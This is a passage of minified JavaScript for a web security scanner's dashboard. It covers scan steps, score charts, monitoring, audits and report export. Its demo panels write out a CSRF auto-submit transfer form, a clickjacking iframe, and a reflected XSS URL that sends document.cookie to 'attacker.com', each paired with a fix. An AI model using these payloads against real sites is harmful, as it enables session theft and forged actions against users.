证书...","验证证书链完整性...","检查证书有效期...","扫描敏感路径...","识别登录态与重定向风险...","检查 XSS 反射与存储特征...","检查 SQL 注入错误回显...","检查 SSRF / 路径穿越线索...","检查弱口令与限流策略...","检测 /.env 文件...","检测 /.git 目录...","检测 /admin 后台...","检测 /phpinfo.php...","检测 /.DS_Store...","识别 WAF 防火墙...","检测 Cloudflare...","检测 Nginx WAF...","检测 ModSecurity...","检查 CORS 跨域配置...","检测 Cookie 安全标志...","检查服务器信息泄露...","计算安全评分...","生成建议...","生成安全报告..."],dt=!1,Be=[];function gn(e){let i=document.getElementById("radar-chart-container");if(!i)return;let t=[{name:"加密传输",key:"https",score:0},{name:"安全响应头",key:"headers",score:0},{name:"信息隐藏",key:"info",score:0},{name:"Cookie安全",key:"cookie",score:0},{name:"访问控制",key:"cors",score:0}],s=e.is_https||!1,r=e.findings||[];t[0].score=s?20:0;let o=r.filter(function(m){return m.name.indexOf("缺少")===0&&m.severity==="high"}).length;t[1].score=Math.max(0,20-o*3);let a=r.some(function(m){return m.name.indexOf("信息泄露")>=0});t[2].score=a?10:20;let n=r.some(function(m){return m.name.indexOf("Cookie")>=0});t[3].score=n?10:20;let d=r.some(function(m){return m.name.indexOf("CORS")>=0});t[4].score=d?10:20;let f=150,v=150,c=110,p='<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';for(let m=1;m<=5;m++){let g=c*m/5,y=[];for(let b=0;b<5;b++){let k=Math.PI*2*b/5-Math.PI/2;y.push(f+g*Math.cos(k)+","+(v+g*Math.sin(k)))}p+='<polygon points="'+y.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=f+c*Math.cos(g),b=v+c*Math.sin(g);p+='<line x1="'+f+'" y1="'+v+'" x2="'+y+'" y2="'+b+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let h=[];for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=c*t[m].score/20;h.push(f+y*Math.cos(g)+","+(v+y*Math.sin(g)))}p+='<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>',p+='<polygon points="'+h.join(" ")+'" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">',p+='<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>',p+="</polygon>";for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=c*t[m].score/20,b=f+y*Math.cos(g),k=v+y*Math.sin(g);p+='<circle cx="'+b+'" cy="'+k+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=f+(c+25)*Math.cos(g),b=v+(c+25)*Math.sin(g),k=Math.abs(Math.cos(g))<.2?"middle":Math.cos(g)>0?"start":"end";p+='<text x="'+y+'" y="'+b+'" text-anchor="'+k+'" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">'+t[m].name+"</text>",p+='<text x="'+y+'" y="'+(b+14)+'" text-anchor="'+k+'" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">'+t[m].score+"/20</text>"}p+="</svg>",i.innerHTML=p}function is(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者构造的恶意页面</div><div>&lt;form action="'+S(e)+'/api/transfer" method="POST"&gt;</div><div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div><div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div><div>&lt;/form&gt;</div><div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div></div><div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px"><strong>如果目标未设置 CSRF 令牌，受害者点击后资金会被转走。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF 令牌 验证</div></div>')}function ns(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击 URL</div><div>'+S(e)+`/search?q=&lt;script&gt;</div><div>&nbsp;&nbsp;fetch('//attacker.com/steal?c='+document.cookie)</div><div>&nbsp;&nbsp;&lt;/script&gt;</div><div>// 受害者的 Cookie 被发送到攻击者服务器</div></div><div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px"><strong>如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div></div>`)}function rs(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">风险示例</span><span style="font-weight:600;font-size:13px">点击劫持</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者页面</div><div>&lt;iframe src="'+S(e)+'"</div><div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div><div>&lt;/iframe&gt;</div><div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div></div><div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px"><strong>用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div></div>')}function hn(e){let i=document.querySelector(".score-ring .score-value");if(!i)return;e=parseInt(e,10),(isNaN(e)||e<0)&&(e=0),e>100&&(e=100),st&&(clearInterval(st),st=null);let t=0,s=Math.max(1,Math.floor(e/50));st=setInterval(function(){t+=s,t>=e&&(t=e,clearInterval(st),st=null),i.textContent=t},20)}function yi(){try{return(function(){try{return JSON.parse(localStorage.getItem("vs_monitors")||"[]")}catch{return[]}})()}catch{return[]}}function vn(e){try{(function(){try{localStorage.setItem("vs_monitors",JSON.stringify(e))}catch{}})()}catch{}}function ss(){let e=document.getElementById("monitor-url-input"),i=document.getElementById("monitor-freq-select"),t=e.value.trim(),s=i.value;if(!t){L("请输入 URL");return}/^https?:\/\//i.test(t)||(t="http://"+t);let r=yi();if(r.some(function(n){return n.url===t})){L("该 URL 已在监控列表中");return}let a={url:t,freq:s,added_at:new Date().toISOString(),last_scan:"-",score:null};ce("/api/targets",{method:"POST",body:JSON.stringify({url:t,schedule:s})}).then(function(n){return n.json()}).then(function(n){n.id&&(a.id=n.id)}).catch(function(){}),r.push(a),vn(r),e.value="",bi(),L("监控目标已添加")}function os(e){if(!confirm("确定要删除此监控目标吗？"))return;let i=yi(),t=i[e];t&&t.id&&ce("/api/targets/"+t.id,{method:"DELETE"}).catch(function(){}),i.splice(e,1),vn(i),bi(),L("监控目标已删除")}function bi(){let e=document.getElementById("monitor-target-list");if(!e)return;let i=yi();if(i.length===0){e.innerHTML='<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';return}let t={daily:"每天",weekly:"每周",none:"不扫描"},s="";i.forEach(function(r,o){let a=r.score!==null?r.score>=75?"var(--success)":r.score>=50?"var(--warning)":"var(--danger)":"var(--text-lighter)";s+='<div class="monitor-item">',s+='<div style="flex:1;min-width:0">',s+='<div class="monitor-item-url">'+S(r.url)+"</div>",s+='<div class="monitor-item-meta">'+t[r.freq]||r.freq+" &middot; 上次扫描: "+(r.last_scan||"-")+"</div>",s+="</div>",s+='<div class="monitor-item-score" style="color:'+a+'">'+(r.score!==null?r.score:"-")+"</div>",s+='<button class="monitor-item-del" onclick="removeMonitorTarget('+o+')"></button>',s+="</div>"}),e.innerHTML=s}function as(e){if(!de){L("暂无扫描结果");return}let i=e||"pdf",t=i==="html"?"HTML":"PDF",s=i==="html"?"html":"pdf";L("正在生成 "+t+" 报告，请稍候...");function r(a){let n="/api/report/"+encodeURIComponent(a)+"?format="+i,d=ls(de.url,s);i==="html"?ce(n).then(function(f){if(!f.ok)throw new Error("报告生成失败（"+f.status+")");return f.text()}).then(function(f){let v=new Blob([f],{type:"text/html;charset=utf-8"}),c=URL.createObjectURL(v),p=document.createElement("a");p.href=c,p.download=d,document.body.appendChild(p),p.click(),document.body.removeChild(p),URL.revokeObjectURL(c),L("HTML 报告已下载："+d)}).catch(function(f){L("报告下载失败: "+f.message)}):ce(n).then(function(f){if(!f.ok)throw new Error("PDF 生成失败（"+f.status+")");return f.blob()}).then(function(f){let v=URL.createObjectURL(f),c=document.createElement("a");c.href=v,c.download=d,document.body.appendChild(c),c.click(),document.body.removeChild(c),URL.revokeObjectURL(v),L("PDF 报告已下载："+d)}).catch(function(f){L("PDF 下载失败: "+f.message)})}let o=de.scan_id;!o||isNaN(Number(o))?ce("/api/history?limit=1").then(function(a){return a.json()}).then(function(a){let n=(a.history||[])[0];n&&n.id?r(n.id):L("当前结果暂不支持下载")}).catch(function(a){L("获取扫描记录失败: "+a.message)}):r(o)}function ls(e,i){return"security-report-"+((it(e||"report")||"report").replace(/[^a-zA-Z0-9._-]+/g,"-").replace(/^-+|-+$/g,"")||"report")+"."+i}function ds(){let e=document.getElementById("report-dropdown");e&&(e.classList.toggle("show"),e.classList.contains("show")&&setTimeout(function(){document.addEventListener("click",mn)},0))}function mn(e){let i=document.querySelector(".report-download-dropdown"),t=document.getElementById("report-dropdown");i&&!i.contains(e.target)&&t&&(t.classList.remove("show"),document.removeEventListener("click",mn))}function cs(){try{return localStorage.getItem("vs_home_onboarding_seen")!=="1"}catch{return!0}}function ps(){try{localStorage.setItem("vs_home_onboarding_seen","1")}catch{}let e=document.getElementById("home-onboarding-banner");e&&(e.style.display="none")}function us(){let e=document.getElementById("home-onboarding-banner");e&&(cs()?e.style.display="block":e.style.display="none")}function yn(){let e=document.getElementById("scan-credits-hint"),i=document.getElementById("scan-credits-value");if(!(!e||!i)){if(!ve()){e.style.display="none";return}e.style.display="block",ce("/api/me/credits").then(function(t){return t.json()}).then(function(t){let s=t&&t.data&&typeof t.data.credits=="number"?t.data.credits:t&&typeof t.credits=="number"?t.credits:null;i.textContent=s===null?"--":String(s)}).catch(function(){i.textContent="--"})}}function fs(){let e=document.getElementById("dashboard-overview");if(!ve()){e&&(e.style.display="none");return}e&&(e.style.display="grid"),us(),yn(),ce("/api/dashboard").then(function(i){return i.json()}).then(function(i){let t=document.getElementById("home-stat-scan-count"),s=document.getElementById("home-stat-high-risk"),r=document.getElementById("home-stat-fixed-count"),o=document.getElementById("home-stat-score");t&&(t.textContent=i.total_scans||0),s&&(s.textContent=i.high_risk_count||0),r&&(r.textContent=i.fixed_count||0),o&&i.recent_scans&&i.recent_scans.length>0?o.textContent=i.recent_scans[0].score||"-":o&&(o.textContent="-")}).catch(function(){}),xn(),loadTrendChart(30)}let ni=!1,Zt=null;function bn(){let e=document.getElementById("audit-url");if(e&&e.value)return e.value.trim();if(de&&de.url)return String(de.url).trim();let i=document.getElementById("scan-url");return i&&i.value?i.value.trim():""}function gs(){let e=document.getElementById("audit-url");if(!e)return;let i=bn();if(!i){L("当前没有可用的网址，请先在扫描页输入网址","warn");return}e.value=i,L("已填入当前网址","success")}function Di(e,i){let t=S(e.name||e.title||"审计项 "+(i+1)),s=String(e.severity||"info").toLowerCase(),r=S(e.summary||e.description||""),o=s==="critical"||s==="high"?"#c75450":s==="medium"?"#f0a732":"#73c990",a=s==="critical"?"严重":s==="high"?"高危":s==="medium"?"中危":s==="low"?"低危":"信息",n=e.confidence||"low",d="";return e.evidence&&typeof e.evidence=="object"?d=ai(e.evidence):e.evidence_text?d='<div style="margin-top:10px;font-size:12px;color:var(--text-secondary)">'+S(e.evidence_text)+"</div>":e.evidence_html&&(d='<div style="margin-top:10px">'+e.evidence_html+"</div>"),'<div style="padding:14px 16px;border:1px solid var(--border);border-radius:2px;background:var(--bg);margin-bottom:10px"><div style="display:flex;justify-content:space-between;gap:12px;align-items:flex-start;margin-bottom:8px"><div style="font-weight:700;color:var(--text)">'+t+'</div><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:'+o+"20;color:"+o+';font-size:12px;font-weight:700">'+a+'</span><span style="flex:0 0 auto;padding:2px 8px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px;font-weight:700">置信度 '+n+"</span></div>"+(r?'<div style="font-size:13px;line-height:1.7;color:var(--text-secondary)">'+r+"</div>":"")+d+"</div>"}async function hs(){if(ni)return;let e=document.getElementById("audit-url"),i=document.getElementById("audit-status"),t=document.getElementById("audit-result"),s=document.getElementById("audit-run-btn"),r=document.getElementById("audit-auth-check"),o=bn();if(!o){L("请输入要审计的网址","warn"),e&&e.focus();return}if(r&&!r.checked){L("请先确认已获得授权","warn");return}ni=!0,s&&(s.disabled=!0,s.textContent="审计中..."),i&&(i.textContent="正在审计 "+o+"，请稍候..."),t&&(t.innerHTML='<div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">正在分析源码泄露、敏感文件与上线前基础风险...</div>');try{let a=await gr({url:o,depth:"standard",authorized:!0}),n=Array.isArray(a.findings)?a.findings:[],d=es(n),f=ts(d),v=d.filter(function(x){return x.confidence!=="low"}),c=d.filter(function(x){return x.confidence==="low"}),p=n.length,h=typeof a.score=="number"?a.score:a.score||"-",m=a.risk_level||a.risk||"未知",g=v.length>0?"发现 "+v.length+" 个较可信源码/上线相关问题":d.length>0?"发现少量建议复核项，优先人工确认":"未发现明显源码泄露迹象",y=v.slice(0,5).map(Di).join(""),b=ji().map(function(x){return'<span style="display:inline-block;margin:0 8px 8px 0;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px">'+S(x)+"</span>"}).join(""),k=d.length===0?'<div style="padding:14px 16px;border:1px solid rgba(115,201,144,0.25);border-radius:2px;background:rgba(115,201,144,0.08);color:var(--text-secondary);line-height:1.7">当前扫描没有发现明显的源码泄露或上线前暴露项。建议在修复后再复测一次，并继续关注强登录态、重定向和 WAF 干扰场景。</div>':"";Zt={url:o,time:new Date().toISOString(),risk:m,score:h,total:p,headline:g,findings:d,trustedFindings:v,reviewFindings:c,rawFindings:n,coverage:[...ji()]},t&&(t.innerHTML='<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:14px"><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">审计目标</div><div style="margin-top:6px;font-weight:700;word-break:break-all">'+S(o)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">风险等级</div><div style="margin-top:6px;font-weight:700">'+S(m)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">安全评分</div><div style="margin-top:6px;font-weight:700">'+S(String(h))+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">问题总数</div><div style="margin-top:6px;font-weight:700">'+p+'</div></div></div><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px"><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">高置信度</div><div style="margin-top:4px;font-weight:700">'+f.high+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">中置信度</div><div style="margin-top:4px;font-weight:700">'+f.medium+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">低置信度</div><div style="margin-top:4px;font-weight:700">'+f.low+'</div></div></div><div style="margin-bottom:14px"><div style="font-size:15px;font-weight:700;margin-bottom:8px">审计结论</div><div style="line-height:1.8;color:var(--text-secondary)">'+g+'</div></div><div style="margin-bottom:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">覆盖范围</div>'+b+"</div>"+k+(y?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">可信命中项</div>'+y+"</div>":"")+(c.length?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">需复核项</div>'+c.slice(0,3).map(Di).join("")+"</div>":"")),i&&(i.textContent=v.length>0?"审计完成，已发现可信项。":d.length>0?"审计完成，发现少量建议复核项，优先人工确认。":"审计完成，未发现明显源码泄露迹象。"),L("审计完成","success")}catch(a){let n=pt(a);Zt=null,i&&(i.textContent="审计失败："+n),t&&(t.innerHTML='<div style="padding:14px 16px;border:1px solid rgba(199,84,80,0.25);border-radius:2px;background:rgba(199,84,80,0.08);color:var(--text-secondary)">'+S(n)+"</div>"),L("审计失败："+n,"error")}finally{ni=!1,s&&(s.disabled=!(r&&r.checked),s.textContent="开始审计")}}function vs(){if(!Zt){L("请先完成一次审计","warn");return}let e=Zt,i=document.querySelector('#page-audit .card button[onclick="downloadAuditReport()"]');i&&(i.disabled=!0,i.textContent="导出中..."),ce("/api/report/audit",{method:"POST",body:JSON.stringify({url:e.url,time:e.time,risk:e.risk,risk_level:e.risk,score:e.score,total:e.total,headline:e.headline,findings:e.findings||[],summary:{critical:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="critical"}).length,high:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="high"}).length,medium:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="medium"}).length,low:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="low"}).length,info:(e.findings||[]).filter(function(t){return!String(t.severity||"").toLowerCase()||String(t.severity||"").toLowerCase()==="info"}).length,total:e.total||(e.findings||[]).length},coverage:e.coverage||[],confidence_counts:e.confidenceCounts||{high:0,medium:0,low:0}})}).then(function(t){return t.ok?t.blob().then(function(s){let r=URL.createObjectURL(s),o=document.createElement("a");o.href=r,o.download="vuln-sentinel-audit-report.pdf",document.body.appendChild(o),o.click(),document.body.removeChild(o),URL.revokeObjectURL(r),L("审计 PDF 已下载")}):t.text().then(function(s){throw new Error(s||"HTTP "+t.status)})}).catch(function(t){L("导出失败："+pt(t),"error")}).finally(function(){i&&(i.disabled=!1,i.textContent="导出审计报告")})}function xn(){let e=document.getElementById("trend-panel");!ve()||!e||(e.style.display="block",ce("/api/trend?limit=30").then(function(i){return i.json()}).then(function(i){let t=i.summary||{},s=i.series||{},r=i.urls||[],o=document.getElementById("trend-summary");if(o){let d=[];t.total_scans>0&&(d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 '+t.avg_score+" 分</span>"),t.improved?d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>'):t.total_scans>1&&d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>')),o.innerHTML=d.join("")}let a=document.getElementById("trend-empty"),n=document.getElementById("trend-canvas");if(t.total_scans===0){a&&(a.style.display="flex"),n&&(n.style.display="none");return}a&&(a.style.display="none"),n&&(n.style.display="block"),wn(s,r)}).catch(function(){}))}function wn(e,i){let t=document.getElementById("trend-canvas");if(!t)return;let s=t.getContext("2d"),r=window.devicePixelRatio||1,o=t.parentElement.getBoundingClientRect();t.width=o.width*r,t.height=o.height*r,s.scale(r,r);let a=o.width,n=o.height,d=["#4b6eaf","#73c990","#f0a732","#c75450","#c75450","#4b6eaf","#4b6eaf"],f=[],v=[];for(let z=0;z<i.length;z++){let P=i[z],R=e[P]||[];if(R.length===0)continue;let j=R.map(function(M){return M.score});v=v.concat(j),f.push({url:P,points:R,color:d[z%d.length]})}if(f.length===0||v.length===0)return;let c={top:20,right:20,bottom:30,left:45},p=a-c.left-c.right,h=n-c.top-c.bottom,m=Math.max(Math.min.apply(null,v)-5,0),g=Math.min(Math.max.apply(null,v)+5,100),y=g-m||1;s.clearRect(0,0,a,n),s.strokeStyle="rgba(255,255,255,0.06)",s.lineWidth=1;let b=5;for(let z=0;z<=b;z++){let P=c.top+z/b*h;s.beginPath(),s.moveTo(c.left,P),s.lineTo(a-c.right,P),s.stroke();let R=Math.round(g-z/b*y);s.fillStyle="rgba(255,255,255,0.4)",s.font="10px sans-serif",s.textAlign="right",s.fillText(R,c.left-8,P+3)}let k=c.top+(g-90)/y*h,x=c.top+(g-70)/y*h;s.fillStyle="rgba(115,201,144,0.05)",s.fillRect(c.left,k,p,c.top-k+h),s.fillStyle="rgba(240,167,50,0.05)",s.fillRect(c.left,x,p,k-x);for(let z=0;z<f.length;z++){let P=f[z],R=P.points,j=R.length;if(j<1)continue;let M=[];for(let D=0;D<j;D++)M.push(c.left+(j>1?D/(j-1)*p:p/2));s.beginPath();for(let D=0;D<j;D++){let Y=M[D],E=c.top+(g-R[D].score)/y*h;D===0?s.moveTo(Y,E):s.lineTo(Y,E)}s.lineTo(M[j-1],c.top+h),s.lineTo(M[0],c.top+h),s.closePath(),s.fillStyle=P.color+"15",s.fill(),s.beginPath(),s.strokeStyle=P.color,s.lineWidth=2.5,s.lineJoin="round",s.lineCap="round";for(let D=0;D<j;D++){let Y=M[D],E=c.top+(g-R[D].score)/y*h;D===0?s.moveTo(Y,E):s.lineTo(Y,E)}s.stroke();for(let D=0;D<j;D++){let Y=M[D],E=c.top+(g-R[D].score)/y*h;s.beginPath(),s.arc(Y,E,4,0,Math.PI*2),s.fillStyle=P.color,s.fill(),s.beginPath(),s.arc(Y,E,2,0,Math.PI*2),s.fillStyle="#fff",s.fill()}if(j>0){let D=M[j-1],Y=c.top+(g-R[j-1].score)/y*h;s.beginPath(),s.arc(D,Y,6,0,Math.PI*2),s.fillStyle=P.color+"40",s.fill(),s.beginPath(),s.arc(D,Y,3.5,0,Math.PI*2),s.fillStyle=P.color,s.fill()}}let C=document.getElementById("trend-legend");if(C){let z="";for(let P=0;P<f.length;P++){let R=it(f[P].url);z+='<div style="display:flex;align-items:center;gap:5px;font-size:12px">',z+='<div style="width:10px;height:3px;border-radius:2px;background:'+f[P].color+'"></div>',z+='<span style="color:var(--text-secondary)">'+S(R)+"</span>",z+="</div>"}C.innerHTML=z}}async function ms(){let e=document.getElementById("public-report-host"),i=document.getElementById("public-report-refresh"),t=e&&e.value||"https://example.com";i&&(i.disabled=!0,i.textContent="扫描中…");let s=document.getElementById("public-report-content");s&&(s.innerHTML='<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>');try{let r=await ce("/api/public-演示-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t})}),o=await r.json();r.ok&&o.success?(window._lastScanId=o.scan_id||o.scanId||null,window._lastScanResult=o,ys(o)):s&&(s.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+S(pt(Ue(o)))+"</div>")}catch(r){s&&(s.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+S(pt(r))+"</div>")}finally{i&&(i.disabled=!1,i.textContent="重新扫描")}}function ys(e){let i=document.getElementById("public-report-content");if(!i)return;let t=e.score||0,s=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",r="#3c3f41",o=e.findings||[],a=e.summary||{high:0,medium:0,low:0},n=[];a.high&&n.push(a.high+" 高风险"),a.medium&&n.push(a.medium+" 中风险"),a.low&&n.push(a.low+" 低风险");let d=e.waf||[],f=d.length?d.map(function(y){return y.name}).join("、"):"未检测到 WAF",v=e.raw_headers||{},c=Object.keys(v),p=[];["strict-transport-security","content-security-policy","x-frame-options","x-content-type-options"].forEach(function(y){c.some(function(b){return b.toLowerCase()===y})||p.push(y)});let h=e.sensitive_paths||[],m="";h.length>0?m=h.slice(0,5).map(function(y){let b=y.exposed?"暴露":"安全";return'<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/'+y.path+"</code><span>"+b+"</span></div>"}).join(""):m='<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 '+(e.sensitive_checked||0)+" 个常见敏感路径，未发现暴露</div>";let g="";if(g+='<div style="background:'+r+";border:1px solid #555555;border-left:3px solid "+s+';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">',g+='<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>',e.note&&(g+='<div style="font-size:12px;color:#f0a732;margin-top:2px">'+S(e.note)+"</div>"),g+='<div style="font-size:14px;font-weight:600;margin-top:2px">'+e.final_url+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: '+(e.is_https?"是":"否")+" · WAF: "+f+' · 风险等级: <strong style="color:'+s+'">'+(e.risk_level||"未知")+"</strong></div></div>",g+='<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:'+s+'">'+t+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>',g+="</div>",e.is_cached&&(g+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">'+S(e.note||"当前展示缓存扫描数据")+"</div>"),g+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">'+a.high+'</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">'+a.medium+'</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">'+a.low+'</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>',g+="</div>",g+='<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>',g+='<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">',c.slice(0,15).forEach(function(y){let b=String(v[y]);g+='<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">'+y+'</span>: <span class="response-header-value">'+S(b)+"</span></div>"}),c.length>15&&(g+='<div style="color:#64748b;margin-top:4px">... 还有 '+(c.length-15)+" 个</div>"),g+="</div></details>",g+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（'+p.length+" 个）</summary>",p.length===0?g+='<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>':(g+='<div style="margin-top:6px;padding:8px;font-size:12px">',p.forEach(function(y){g+="缺失: "+y+"<br>"}),g+="</div>"),g+="</details>",g+='<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>',g+='<div style="margin-top:6px">'+m+"</div></details>",o.length>0&&(g+='<details 